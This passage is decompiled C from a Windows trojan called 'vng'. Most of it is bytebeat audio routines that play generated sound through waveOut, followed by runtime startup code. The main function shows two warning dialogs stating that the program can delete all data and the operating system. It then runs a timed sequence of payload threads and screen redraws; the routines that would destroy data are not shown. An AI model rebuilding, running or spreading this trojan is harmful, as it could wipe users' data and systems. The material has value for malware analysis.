      auVar11 = pshufb(auVar13,_DAT_004068c0);
      auVar3 = vpmovzxbw_avx2(auVar7);
      auVar2 = vpmullw_avx2(auVar3,auVar2);
      auVar6 = vpmovwb_avx512vl(auVar2);
      uVar9 = auVar11._0_4_ ^ auVar6._0_4_;
      uVar19 = auVar11._4_4_ ^ auVar6._4_4_;
      uVar20 = auVar11._8_4_ ^ auVar6._8_4_;
      uVar21 = auVar11._12_4_ ^ auVar6._12_4_;
      auVar14[0] = (char)uVar9 + auVar7[0];
      auVar14[1] = (char)(uVar9 >> 8) + auVar7[1];
      auVar14[2] = (char)(uVar9 >> 0x10) + auVar7[2];
      auVar14[3] = (char)(uVar9 >> 0x18) + auVar7[3];
      auVar14[4] = (char)uVar19 + auVar7[4];
      auVar14[5] = (char)(uVar19 >> 8) + auVar7[5];
      auVar14[6] = (char)(uVar19 >> 0x10) + auVar7[6];
      auVar14[7] = (char)(uVar19 >> 0x18) + auVar7[7];
      auVar14[8] = (char)uVar20 + auVar7[8];
      auVar14[9] = (char)(uVar20 >> 8) + auVar7[9];
      auVar14[10] = (char)(uVar20 >> 0x10) + auVar7[10];
      auVar14[0xb] = (char)(uVar20 >> 0x18) + auVar7[0xb];
      auVar14[0xc] = (char)uVar21 + auVar7[0xc];
      auVar14[0xd] = (char)(uVar21 >> 8) + auVar7[0xd];
      auVar14[0xe] = (char)(uVar21 >> 0x10) + auVar7[0xe];
      auVar14[0xf] = (char)(uVar21 >> 0x18) + auVar7[0xf];
      auVar2 = vpmovzxbw_avx2(auVar14);
      auVar3 = vpmovzxbw_avx2(ZEXT416(0x5050505));
      auVar2 = vpmullw_avx2(auVar2,auVar3);
      auVar6 = vpmovwb_avx512vl(auVar2);
      *(int *)(aCStack_50c18 + uVar5) = auVar6._0_4_;
      auVar11._4_4_ = uVar4 + 9;
      auVar11._0_4_ = uVar4 + 8;
      auVar11._8_4_ = uVar4 + 10;
      auVar11._12_4_ = uVar4 + 0xb;
      auVar2 = vpmovzxbw_avx2(ZEXT416(0x3030303));
      auVar15._0_4_ = uVar4 + 8 >> 8;
      auVar15._4_4_ = uVar4 + 9 >> 8;
      auVar15._8_4_ = uVar4 + 10 >> 8;
      auVar15._12_4_ = uVar4 + 0xb >> 8;
      auVar7 = pshufb(auVar11,_DAT_004068c0);
      auVar11 = pshufb(auVar15,_DAT_004068c0);
      auVar3 = vpmovzxbw_avx2(auVar7);
      auVar2 = vpmullw_avx2(auVar3,auVar2);
      auVar6 = vpmovwb_avx512vl(auVar2);
      uVar9 = auVar11._0_4_ ^ auVar6._0_4_;
      uVar19 = auVar11._4_4_ ^ auVar6._4_4_;
      uVar20 = auVar11._8_4_ ^ auVar6._8_4_;
      uVar21 = auVar11._12_4_ ^ auVar6._12_4_;
      auVar16[0] = (char)uVar9 + auVar7[0];
      auVar16[1] = (char)(uVar9 >> 8) + auVar7[1];
      auVar16[2] = (char)(uVar9 >> 0x10) + auVar7[2];
      auVar16[3] = (char)(uVar9 >> 0x18) + auVar7[3];
      auVar16[4] = (char)uVar19 + auVar7[4];
      auVar16[5] = (char)(uVar19 >> 8) + auVar7[5];
      auVar16[6] = (char)(uVar19 >> 0x10) + auVar7[6];
      auVar16[7] = (char)(uVar19 >> 0x18) + auVar7[7];
      auVar16[8] = (char)uVar20 + auVar7[8];
      auVar16[9] = (char)(uVar20 >> 8) + auVar7[9];
      auVar16[10] = (char)(uVar20 >> 0x10) + auVar7[10];
      auVar16[0xb] = (char)(uVar20 >> 0x18) + auVar7[0xb];
      auVar16[0xc] = (char)uVar21 + auVar7[0xc];
      auVar16[0xd] = (char)(uVar21 >> 8) + auVar7[0xd];
      auVar16[0xe] = (char)(uVar21 >> 0x10) + auVar7[0xe];
      auVar16[0xf] = (char)(uVar21 >> 0x18) + auVar7[0xf];
      auVar2 = vpmovzxbw_avx2(auVar16);
      auVar3 = vpmovzxbw_avx2(ZEXT416(0x5050505));
      auVar2 = vpmullw_avx2(auVar2,auVar3);
      auVar6 = vpmovwb_avx512vl(auVar2);
      *(int *)((int)auStack_50c14 + uVar4 + 4) = auVar6._0_4_;
      auVar8._4_4_ = uVar4 + 0xd;
      auVar8._0_4_ = uVar4 + 0xc;
      auVar8._8_4_ = uVar4 + 0xe;
      auVar8._12_4_ = uVar4 + 0xf;
      auVar7 = pshufb(auVar8,_DAT_004068c0);
      auVar17._0_4_ = uVar4 + 0xc >> 8;
      auVar17._4_4_ = uVar4 + 0xd >> 8;
      auVar17._8_4_ = uVar4 + 0xe >> 8;
      auVar17._12_4_ = uVar4 + 0xf >> 8;
      auVar2 = vpmovzxbw_avx2(ZEXT416(0x3030303));
      auVar3 = vpmovzxbw_avx2(auVar7);
      auVar2 = vpmullw_avx2(auVar3,auVar2);
      auVar11 = pshufb(auVar17,_DAT_004068c0);
      auVar6 = vpmovwb_avx512vl(auVar2);
      uVar9 = auVar11._0_4_ ^ auVar6._0_4_;
      uVar19 = auVar11._4_4_ ^ auVar6._4_4_;
      uVar20 = auVar11._8_4_ ^ auVar6._8_4_;
      uVar21 = auVar11._12_4_ ^ auVar6._12_4_;
      auVar18[0] = (char)uVar9 + auVar7[0];
      auVar18[1] = (char)(uVar9 >> 8) + auVar7[1];
      auVar18[2] = (char)(uVar9 >> 0x10) + auVar7[2];
      auVar18[3] = (char)(uVar9 >> 0x18) + auVar7[3];
      auVar18[4] = (char)uVar19 + auVar7[4];
      auVar18[5] = (char)(uVar19 >> 8) + auVar7[5];
      auVar18[6] = (char)(uVar19 >> 0x10) + auVar7[6];
      auVar18[7] = (char)(uVar19 >> 0x18) + auVar7[7];
      auVar18[8] = (char)uVar20 + auVar7[8];
      auVar18[9] = (char)(uVar20 >> 8) + auVar7[9];
      auVar18[10] = (char)(uVar20 >> 0x10) + auVar7[10];
      auVar18[0xb] = (char)(uVar20 >> 0x18) + auVar7[0xb];
      auVar18[0xc] = (char)uVar21 + auVar7[0xc];
      auVar18[0xd] = (char)(uVar21 >> 8) + auVar7[0xd];
      auVar18[0xe] = (char)(uVar21 >> 0x10) + auVar7[0xe];
      auVar18[0xf] = (char)(uVar21 >> 0x18) + auVar7[0xf];
      auVar2 = vpmovzxbw_avx2(auVar18);
      auVar3 = vpmovzxbw_avx2(ZEXT416(0x5050505));
      auVar2 = vpmullw_avx2(auVar2,auVar3);
      auVar6 = vpmovwb_avx512vl(auVar2);
      uVar5 = uVar5 + 0x10;
      *(int *)((int)auStack_50c14 + uVar4 + 8) = auVar6._0_4_;
      uVar4 = uVar4 + 0x10;
    } while (uVar5 < 0x50bf4);
    if (0x50bfd < uVar4) goto LAB_00403de6;
  }
  do {
    uStack_50c34._0_1_ = (byte)(uVar4 >> 8);
    bVar1 = (byte)uStack_50c34 ^ (char)uVar4 * '\x03';
    uStack_50c34 = (uint)CONCAT21((short)(uVar4 >> 0x10),bVar1);
    aCStack_50c18[uVar4] = (bVar1 + (char)uVar4) * '\x05';
    uVar4 = uVar4 + 1;
  } while (uVar4 < 0x50bfe);
LAB_00403de6:
  wStack_50c54.lpData = aCStack_50c18;
  wStack_50c54.dwBufferLength = 0x50bfe;
  wStack_50c54.dwBytesRecorded = 0;
  wStack_50c54.dwUser = 0;
  wStack_50c54.dwFlags = 0;
  wStack_50c54.dwLoops = 0;
  wStack_50c54.lpNext = (wavehdr_tag *)0x0;
  wStack_50c54.reserved = 0;
  waveOutPrepareHeader(pHStack_50c30,&wStack_50c54,0x20);
  waveOutWrite(pHStack_50c30,&wStack_50c54,0x20);
  waveOutUnprepareHeader(pHStack_50c30,&wStack_50c54,0x20);
  waveOutClose(pHStack_50c30);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403ea0(void)

{
  undefined1 auVar1 [32];
  undefined1 auVar2 [32];
  uint uVar3;
  uint uVar4;
  undefined1 auVar5 [16];
  uint uVar6;
  undefined1 auVar7 [16];
  undefined1 auVar8 [16];
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  undefined1 auVar11 [16];
  undefined1 auVar12 [16];
  undefined1 auVar13 [16];
  uint uVar16;
  uint uVar17;
  uint uVar18;
  undefined1 auVar14 [16];
  undefined1 auVar15 [16];
  wavehdr_tag wStack_50c50;
  HWAVEOUT pHStack_50c30;
  undefined1 auStack_50c2c [20];
  CHAR aCStack_50c18 [4];
  undefined4 auStack_50c14 [82689];
  
  pHStack_50c30 = (HWAVEOUT)0x0;
  auStack_50c2c._16_2_ = 0;
  auStack_50c2c._0_2_ = 1;
  auStack_50c2c._2_2_ = 1;
  auStack_50c2c._4_4_ = 0x2b11;
  auStack_50c2c._8_4_ = 0x2b11;
  auStack_50c2c._12_2_ = 1;
  auStack_50c2c._14_2_ = 8;
  waveOutOpen(&pHStack_50c30,0xffffffff,(LPCWAVEFORMATEX)auStack_50c2c,0,0,0);
  memset(aCStack_50c18,0,0x50bfe);
  uVar3 = 0;
  if (5 < DAT_004083c8) {
    uVar4 = 4;
    uVar6 = uVar3;
    do {
      uVar3 = uVar6 + 8;
      uVar16 = uVar6 + 1;
      auVar12._4_4_ = uVar16;
      auVar12._0_4_ = uVar6;
      uVar17 = uVar6 + 2;
      uVar18 = uVar6 + 3;
      auVar10._0_4_ = uVar6 >> 8;
      auVar10._4_4_ = uVar16 >> 8;
      auVar10._8_4_ = uVar17 >> 8;
      auVar10._12_4_ = uVar18 >> 8;
      auVar12._8_4_ = uVar17;
      auVar12._12_4_ = uVar18;
      auVar5._0_4_ = uVar6 >> 4;
      auVar5._4_4_ = uVar16 >> 4;
      auVar5._8_4_ = uVar17 >> 4;
      auVar5._12_4_ = uVar18 >> 4;
      auVar7 = pshufb(auVar10,_DAT_004068c0);
      auVar5 = pshufb(auVar5,_DAT_004068c0);
      auVar14._0_4_ = uVar6 >> 7;
      auVar14._4_4_ = uVar16 >> 7;
      auVar14._8_4_ = uVar17 >> 7;
      auVar14._12_4_ = uVar18 >> 7;
      auVar8._0_4_ = auVar7._0_4_ & auVar5._0_4_;
      auVar8._4_4_ = auVar7._4_4_ & auVar5._4_4_;
      auVar8._8_4_ = auVar7._8_4_ & auVar5._8_4_;
      auVar8._12_4_ = auVar7._12_4_ & auVar5._12_4_;
      auVar7 = pshufb(auVar14,_DAT_004068c0);
      auVar5 = pshufb(auVar12,_DAT_004068c0);
      auVar1 = vpmovzxbw_avx2(auVar8 | auVar7);
      auVar2 = vpmovzxbw_avx2(auVar5);
      auVar1 = vpmullw_avx2(auVar1,auVar2);
      auVar5 = vpmovwb_avx512vl(auVar1);
      uVar6 = auVar5._0_4_ & 0xbfbfbfbf;
      *(uint *)(auStack_50c2c + uVar4 + 0x10) =
           CONCAT13((char)(uVar6 >> 0x18) + -0x10,
                    CONCAT12((char)(uVar6 >> 0x10) + -0x10,
                             CONCAT11((char)(uVar6 >> 8) + -0x10,(char)uVar6 + -0x10)));
      uVar6 = uVar4 + 1;
      auVar13._4_4_ = uVar6;
      auVar13._0_4_ = uVar4;
      uVar16 = uVar4 + 2;
      uVar17 = uVar4 + 3;
      auVar9._0_4_ = uVar4 >> 8;
      auVar9._4_4_ = uVar6 >> 8;
      auVar9._8_4_ = uVar16 >> 8;
      auVar9._12_4_ = uVar17 >> 8;
      auVar13._8_4_ = uVar16;
      auVar13._12_4_ = uVar17;
      auVar7._0_4_ = uVar4 >> 4;
      auVar7._4_4_ = uVar6 >> 4;
      auVar7._8_4_ = uVar16 >> 4;
      auVar7._12_4_ = uVar17 >> 4;
      auVar10 = pshufb(auVar9,_DAT_004068c0);
      auVar5 = pshufb(auVar7,_DAT_004068c0);
      auVar15._0_4_ = uVar4 >> 7;
      auVar15._4_4_ = uVar6 >> 7;
      auVar15._8_4_ = uVar16 >> 7;
      auVar15._12_4_ = uVar17 >> 7;
      auVar11._0_4_ = auVar10._0_4_ & auVar5._0_4_;
      auVar11._4_4_ = auVar10._4_4_ & auVar5._4_4_;
      auVar11._8_4_ = auVar10._8_4_ & auVar5._8_4_;
      auVar11._12_4_ = auVar10._12_4_ & auVar5._12_4_;
      auVar7 = pshufb(auVar15,_DAT_004068c0);
      auVar5 = pshufb(auVar13,_DAT_004068c0);
      auVar1 = vpmovzxbw_avx2(auVar11 | auVar7);
      auVar2 = vpmovzxbw_avx2(auVar5);
      auVar1 = vpmullw_avx2(auVar1,auVar2);
      auVar5 = vpmovwb_avx512vl(auVar1);
      uVar6 = auVar5._0_4_ & 0xbfbfbfbf;
      *(uint *)(aCStack_50c18 + uVar4) =
           CONCAT13((char)(uVar6 >> 0x18) + -0x10,
                    CONCAT12((char)(uVar6 >> 0x10) + -0x10,
                             CONCAT11((char)(uVar6 >> 8) + -0x10,(char)uVar6 + -0x10)));
      uVar4 = uVar4 + 8;
      uVar6 = uVar3;
    } while (uVar4 < 0x50bfc);
    if (0x50bfd < uVar3) goto LAB_004040a1;
  }
  do {
    aCStack_50c18[uVar3] =
         (((byte)(uVar3 >> 8) & (byte)(uVar3 >> 4) | (byte)(uVar3 >> 7)) * (char)uVar3 & 0xbf) -
         0x10;
    uVar3 = uVar3 + 1;
  } while (uVar3 < 0x50bfe);
LAB_004040a1:
  wStack_50c50.lpData = aCStack_50c18;
  wStack_50c50.dwBufferLength = 0x50bfe;
  wStack_50c50.dwBytesRecorded = 0;
  wStack_50c50.dwUser = 0;
  wStack_50c50.dwFlags = 0;
  wStack_50c50.dwLoops = 0;
  wStack_50c50.lpNext = (wavehdr_tag *)0x0;
  wStack_50c50.reserved = 0;
  waveOutPrepareHeader(pHStack_50c30,&wStack_50c50,0x20);
  waveOutWrite(pHStack_50c30,&wStack_50c50,0x20);
  waveOutUnprepareHeader(pHStack_50c30,&wStack_50c50,0x20);
  waveOutClose(pHStack_50c30);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie

void FUN_00404150(void)

{
  byte bVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  wavehdr_tag wStack_3a9c8;
  undefined4 uStack_3a9a8;
  HWAVEOUT pHStack_3a9a4;
  WAVEFORMATEX WStack_3a9a0;
  CHAR aCStack_3a98c [240008];
  
  pHStack_3a9a4 = (HWAVEOUT)0x0;
  WStack_3a9a0.cbSize = 0;
  WStack_3a9a0.wFormatTag = 1;
  WStack_3a9a0.nChannels = 1;
  WStack_3a9a0.nSamplesPerSec = 8000;
  WStack_3a9a0.nAvgBytesPerSec = 8000;
  WStack_3a9a0.nBlockAlign = 1;
  WStack_3a9a0.wBitsPerSample = 8;
  waveOutOpen(&pHStack_3a9a4,0xffffffff,&WStack_3a9a0,0,0,0);
  memset(aCStack_3a98c,0,240000);
  uVar5 = 0;
  do {
    uVar6 = uVar5 & 0xfff;
    if (uVar6 != 0) {
      bVar1 = (byte)(uVar5 >> 0xc);
      uVar4 = ((0x9866 >> (bVar1 & 0xc) & 0xfU) * uVar5) / 6 & 0x7f;
      uVar3 = CONCAT21((short)(uVar5 >> 0x10),
                       (byte)(uVar5 >> 8) ^ (byte)(uVar5 >> 6) | (byte)uVar4 | bVar1) & 0xffffff3f;
      cVar2 = (char)uVar3 + (char)((uVar4 * uVar6) / 10000);
      uStack_3a9a8 = CONCAT31((int3)(uVar3 >> 8),cVar2);
      aCStack_3a98c[uVar5] = cVar2 + (char)(0x80 / (ulonglong)uVar6) * -6;
    }
    uVar5 = uVar5 + 1;
  } while (uVar5 < 240000);
  wStack_3a9c8.lpData = aCStack_3a98c;
  wStack_3a9c8.dwBufferLength = 240000;
  wStack_3a9c8.dwBytesRecorded = 0;
  wStack_3a9c8.dwUser = 0;
  wStack_3a9c8.dwFlags = 0;
  wStack_3a9c8.dwLoops = 0;
  wStack_3a9c8.lpNext = (wavehdr_tag *)0x0;
  wStack_3a9c8.reserved = 0;
  waveOutPrepareHeader(pHStack_3a9a4,&wStack_3a9c8,0x20);
  waveOutWrite(pHStack_3a9a4,&wStack_3a9c8,0x20);
  waveOutUnprepareHeader(pHStack_3a9a4,&wStack_3a9c8,0x20);
  waveOutClose(pHStack_3a9a4);
  return;
}



void FUN_00404310(void)

{
  int iVar1;
  HANDLE pvVar2;
  HANDLE pvVar3;
  
  iVar1 = MessageBoxW((HWND)0x0,
                      L"Warning! You have ran a trojan known as vng that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it\'s highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?"
                      ,L"vng",0x34);
  if (iVar1 != 7) {
    iVar1 = MessageBoxW((HWND)0x0,
                        L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution."
                        ,L"vng",0x34);
    if (iVar1 != 7) {
      Sleep(5000);
      pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_004012e0,(LPVOID)0x0,0,(LPDWORD)0x0);
      CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401450,(LPVOID)0x0,0,(LPDWORD)0x0);
      FUN_00402ed0();
      Sleep(30000);
      TerminateThread(pvVar2,0);
      CloseHandle(pvVar2);
      RedrawWindow((HWND)0x0,(RECT *)0x0,(HRGN)0x0,0x85);
      Sleep(100);
      pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401730,(LPVOID)0x0,0,(LPDWORD)0x0);
      pvVar3 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_004019c0,(LPVOID)0x0,0,(LPDWORD)0x0);
      FUN_004030f0();
      Sleep(30000);
      TerminateThread(pvVar2,0);
      CloseHandle(pvVar2);
      TerminateThread(pvVar3,0);
      CloseHandle(pvVar3);
      RedrawWindow((HWND)0x0,(RECT *)0x0,(HRGN)0x0,0x85);
      Sleep(100);
      pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401b80,(LPVOID)0x0,0,(LPDWORD)0x0);
      pvVar3 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401d00,(LPVOID)0x0,0,(LPDWORD)0x0);
      CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401e10,(LPVOID)0x0,0,(LPDWORD)0x0);
      FUN_00403280();
      Sleep(30000);
      TerminateThread(pvVar2,0);
      CloseHandle(pvVar2);
      RedrawWindow((HWND)0x0,(RECT *)0x0,(HRGN)0x0,0x85);
      Sleep(100);
      pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401f40,(LPVOID)0x0,0,(LPDWORD)0x0);
      FUN_00403550();
      Sleep(30000);
      TerminateThread(pvVar2,0);
      CloseHandle(pvVar2);
      TerminateThread(pvVar3,0);
      CloseHandle(pvVar3);
      RedrawWindow((HWND)0x0,(RECT *)0x0,(HRGN)0x0,0x85);
      Sleep(100);
      pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_004021a0,(LPVOID)0x0,0,(LPDWORD)0x0);
      CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00402320,(LPVOID)0x0,0,(LPDWORD)0x0);
      FUN_00403830();
      Sleep(30000);
      TerminateThread(pvVar2,0);
      CloseHandle(pvVar2);
      RedrawWindow((HWND)0x0,(RECT *)0x0,(HRGN)0x0,0x85);
      Sleep(100);
      pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00402390,(LPVOID)0x0,0,(LPDWORD)0x0);
      pvVar3 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_004024e0,(LPVOID)0x0,0,(LPDWORD)0x0);
      FUN_004039a0();
      Sleep(30000);
      TerminateThread(pvVar2,0);
      CloseHandle(pvVar2);
      TerminateThread(pvVar3,0);
      CloseHandle(pvVar3);
      RedrawWindow((HWND)0x0,(RECT *)0x0,(HRGN)0x0,0x85);
      Sleep(100);
      pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00402640,(LPVOID)0x0,0,(LPDWORD)0x0);
      pvVar3 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00402770,(LPVOID)0x0,0,(LPDWORD)0x0);
      CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00402950,(LPVOID)0x0,0,(LPDWORD)0x0);
      FUN_00403b30();
      Sleep(30000);
      TerminateThread(pvVar2,0);
      CloseHandle(pvVar2);
      TerminateThread(pvVar3,0);
      CloseHandle(pvVar3);
      RedrawWindow((HWND)0x0,(RECT *)0x0,(HRGN)0x0,0x85);
      Sleep(100);
      pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00402ab0,(LPVOID)0x0,0,(LPDWORD)0x0);
      FUN_00403ea0();
      Sleep(30000);
      TerminateThread(pvVar2,0);
      CloseHandle(pvVar2);
      RedrawWindow((HWND)0x0,(RECT *)0x0,(HRGN)0x0,0x85);
      Sleep(100);
      CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00402cd0,(LPVOID)0x0,0,(LPDWORD)0x0);
      FUN_00404150();
      Sleep(30000);
      return;
    }
  }
                    // WARNING: Subroutine does not return
  ExitProcess(0);
}



// WARNING: This is an inlined function

void __fastcall __security_check_cookie(uintptr_t _StackCookie)

{
  if (_StackCookie == DAT_00408000) {
    return;
  }
  FUN_00404952();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4

int FUN_004047a1(void)

{
  code *pcVar1;
  bool bVar2;
  undefined4 uVar3;
  int iVar4;
  int *piVar5;
  uint uVar6;
  int unaff_ESI;
  undefined4 uVar7;
  undefined4 uVar8;
  void *local_14;
  
  uVar3 = ___scrt_initialize_crt(1);
  if ((char)uVar3 != '\0') {
    bVar2 = false;
    uVar3 = ___scrt_acquire_startup_lock();
    if (DAT_00408384 != 1) {
      if (DAT_00408384 == 0) {
        DAT_00408384 = 1;
        iVar4 = initterm_e(&DAT_0040619c,&DAT_004061a8);
        if (iVar4 != 0) {
          ExceptionList = local_14;
          return 0xff;
        }
        initterm(&DAT_00406190,&DAT_00406198);
        DAT_00408384 = 2;
      }
      else {
        bVar2 = true;
      }
      ___scrt_release_startup_lock((char)uVar3);
      piVar5 = (int *)FUN_00404dad();
      if ((*piVar5 != 0) && (uVar3 = FUN_00404b81((int)piVar5), (char)uVar3 != '\0')) {
        pcVar1 = (code *)*piVar5;
        uVar8 = 0;
        uVar7 = 2;
        uVar3 = 0;
        guard_check_icall();
        (*pcVar1)(uVar3,uVar7,uVar8);
      }
      piVar5 = (int *)FUN_00404db3();
      if ((*piVar5 != 0) && (uVar3 = FUN_00404b81((int)piVar5), (char)uVar3 != '\0')) {
        register_thread_local_exe_atexit_callback(*piVar5);
      }
      FUN_00404ece();
      get_narrow_winmain_command_line();
      unaff_ESI = FUN_00404310();
      uVar6 = FUN_00404f03();
      if ((char)uVar6 != '\0') {
        if (!bVar2) {
          _cexit();
        }
        ___scrt_uninitialize_crt(1,'\0');
        ExceptionList = local_14;
        return unaff_ESI;
      }
      goto LAB_00404911;
    }
  }
  FUN_00404db9();
LAB_00404911:
                    // WARNING: Subroutine does not return
  exit(unaff_ESI);
}



void entry(void)

{
  ___security_init_cookie();
  FUN_004047a1();
  return;
}



void __cdecl FUN_0040492a(_EXCEPTION_POINTERS *param_1)

{
  HANDLE hProcess;
  UINT uExitCode;
  
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  UnhandledExceptionFilter(param_1);
  uExitCode = 0xc0000409;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00404952(void)

{
  code *pcVar1;
  uint uVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar3;
  uint extraout_EDX;
  undefined4 unaff_EBX;
  undefined4 unaff_EBP;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined2 in_ES;
  undefined2 in_CS;
  undefined2 in_SS;
  undefined2 in_DS;
  undefined2 in_FS;
  undefined2 in_GS;
  byte bVar4;
  byte bVar5;
  byte in_AF;
  byte bVar6;
  byte bVar7;
  byte in_TF;
  byte in_IF;
  byte bVar8;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  longlong lVar9;
  undefined4 unaff_retaddr;
  
  uVar2 = IsProcessorFeaturePresent(0x17);
  bVar4 = 0;
  bVar8 = 0;
  bVar7 = (int)uVar2 < 0;
  bVar6 = uVar2 == 0;
  bVar5 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;
  lVar9 = (ulonglong)extraout_EDX << 0x20;
  uVar3 = extraout_ECX;
  if (!(bool)bVar6) {
    pcVar1 = (code *)swi(0x29);
    lVar9 = (*pcVar1)();
    uVar3 = extraout_ECX_00;
  }
  _DAT_00408160 = (undefined4)((ulonglong)lVar9 >> 0x20);
  _DAT_00408168 = (undefined4)lVar9;
  _DAT_00408178 =
       (uint)(in_NT & 1) * 0x4000 | (uint)(bVar8 & 1) * 0x800 | (uint)(in_IF & 1) * 0x200 |
       (uint)(in_TF & 1) * 0x100 | (uint)(bVar7 & 1) * 0x80 | (uint)(bVar6 & 1) * 0x40 |
       (uint)(in_AF & 1) * 0x10 | (uint)(bVar5 & 1) * 4 | (uint)(bVar4 & 1) |
       (uint)(in_ID & 1) * 0x200000 | (uint)(in_VIP & 1) * 0x100000 | (uint)(in_VIF & 1) * 0x80000 |
       (uint)(in_AC & 1) * 0x40000;
  _DAT_0040817c = &stack0x00000004;
  _DAT_004080b8 = 0x10001;
  _DAT_00408068 = 0xc0000409;
  _DAT_0040806c = 1;
  _DAT_00408078 = 1;
  DAT_0040807c = 2;
  _DAT_00408074 = unaff_retaddr;
  _DAT_00408144 = in_GS;
  _DAT_00408148 = in_FS;
  _DAT_0040814c = in_ES;
  _DAT_00408150 = in_DS;
  _DAT_00408154 = unaff_EDI;
  _DAT_00408158 = unaff_ESI;
  _DAT_0040815c = unaff_EBX;
  _DAT_00408164 = uVar3;
  _DAT_0040816c = unaff_EBP;
  DAT_00408170 = unaff_retaddr;
  _DAT_00408174 = in_CS;
  _DAT_00408180 = in_SS;
  FUN_0040492a((_EXCEPTION_POINTERS *)&PTR_DAT_004061c0);
  return;
}



int __cdecl FUN_00404a4d(int param_1,uint param_2)

{
  int iVar1;
  int iVar2;
  
  iVar1 = *(int *)(param_1 + 0x3c) + param_1;
  iVar2 = iVar1 + 0x18 + (uint)*(ushort *)(iVar1 + 0x14);
  iVar1 = (uint)*(ushort *)(iVar1 + 6) * 0x28 + iVar2;
  while( true ) {
    if (iVar2 == iVar1) {
      return 0;
    }
    if ((*(uint *)(iVar2 + 0xc) <= param_2) &&
       (param_2 < *(int *)(iVar2 + 8) + *(uint *)(iVar2 + 0xc))) break;
    iVar2 = iVar2 + 0x28;
  }
  return iVar2;
}



// Library Function - Single Match
//  ___scrt_acquire_startup_lock
// 
// Libraries: Visual Studio 2017 Release, Visual Studio 2019 Release

undefined4 ___scrt_acquire_startup_lock(void)

{
  void *pvVar1;
  bool bVar2;
  undefined3 extraout_var;
  void *pvVar3;
  
  bVar2 = ___scrt_is_ucrt_dll_in_use();
  if (CONCAT31(extraout_var,bVar2) != 0) {
    while( true ) {
      pvVar3 = (void *)0x0;
      LOCK();
      pvVar1 = StackBase;
      if (DAT_00408388 != (void *)0x0) {
        pvVar3 = DAT_00408388;
        pvVar1 = DAT_00408388;
      }
      DAT_00408388 = pvVar1;
      UNLOCK();
      if (pvVar3 == (void *)0x0) break;
      if (StackBase == pvVar3) {
        return CONCAT31((int3)((uint)pvVar3 >> 8),1);
      }
    }
  }
  return 0;
}



// Library Function - Single Match
//  ___scrt_initialize_crt
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

int __cdecl ___scrt_initialize_crt(int param_1)

{
  char cVar1;
  uint3 extraout_var;
  uint3 uVar2;
  undefined3 extraout_var_00;
  uint3 extraout_var_01;
  
  if (param_1 == 0) {
    DAT_0040838c = 1;
  }
  FUN_00405084();
  cVar1 = FUN_00404d51();
  uVar2 = extraout_var;
  if (cVar1 != '\0') {
    cVar1 = FUN_00404d51();
    if (cVar1 != '\0') {
      return CONCAT31(extraout_var_00,1);
    }
    FUN_00404d51();
    uVar2 = extraout_var_01;
  }
  return (uint)uVar2 << 8;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___scrt_initialize_onexit_tables
// 
// Library: Visual Studio 2019 Release

undefined4 __cdecl ___scrt_initialize_onexit_tables(int param_1)

{
  code *pcVar1;
  bool bVar2;
  undefined4 in_EAX;
  undefined3 extraout_var;
  uint uVar4;
  undefined4 uVar5;
  int iVar3;
  
  if (DAT_0040838d != '\0') {
    return CONCAT31((int3)((uint)in_EAX >> 8),1);
  }
  if ((param_1 != 0) && (param_1 != 1)) {
    FUN_00404db9();
    pcVar1 = (code *)swi(3);
    uVar5 = (*pcVar1)();
    return uVar5;
  }
  bVar2 = ___scrt_is_ucrt_dll_in_use();
  iVar3 = CONCAT31(extraout_var,bVar2);
  if ((iVar3 == 0) || (param_1 != 0)) {
    DAT_00408390 = 0xffffffff;
    _DAT_00408394 = 0xffffffff;
    _DAT_00408398 = 0xffffffff;
    _DAT_0040839c = 0xffffffff;
    _DAT_004083a0 = 0xffffffff;
    _DAT_004083a4 = 0xffffffff;
LAB_00404b6d:
